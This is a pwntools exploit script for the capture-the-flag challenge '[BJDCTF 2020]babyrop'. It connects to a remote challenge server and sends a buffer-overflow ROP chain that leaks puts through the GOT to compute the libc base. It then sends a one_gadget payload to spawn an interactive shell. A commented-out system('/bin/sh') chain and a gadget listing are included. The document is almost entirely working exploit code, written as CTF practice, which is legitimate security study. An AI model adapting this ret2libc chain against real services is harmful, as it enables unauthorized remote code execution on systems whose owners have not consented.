from pwn import *
context(log_level='debug',os='linux',arch='amd64',terminal=['tmux','splitw','-h'])

# io=process("./[BJDCTF 2020]babyrop")
elf=ELF("./[BJDCTF 2020]babyrop")
libc=ELF("./libc-2.23.so")
io=remote("1.14.71.254",28875)

pop_rdi_ret=0x400733
puts_plt=elf.plt[b"puts"]
puts_got=elf.got[b"puts"]
start_addr=elf.sym[b"_start"]

payload=cyclic(0x28)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(start_addr)
io.recvuntil(b"story!\n")
io.sendline(payload)

leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
print("leak_addr  "+hex(leak_addr))
base_addr=leak_addr-libc.sym[b"puts"]
print("base_addr  "+hex(base_addr))
# sys_addr=base_addr+libc.sym[b"system"]
# bin_addr=base_addr+next(libc.search(b"/bin/sh"))
# payload=cyclic(0x28)+p64(bin_addr)+p64(sys_addr)
one_gadget=base_addr+0xf02a4
payload=cyclic(0x28)+p64(one_gadget)
io.recvuntil(b"story!\n")
io.sendline(payload)

io.interactive()

# Gadgets information
# ============================================================
# 0x000000000040072c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040072e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400730 : pop r14 ; pop r15 ; ret
# 0x0000000000400732 : pop r15 ; ret
# 0x000000000040072b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040072f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400590 : pop rbp ; ret
# 0x0000000000400733 : pop rdi ; ret
# 0x0000000000400731 : pop rsi ; pop r15 ; ret
# 0x000000000040072d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004004c9 : ret

# Unique gadgets found: 11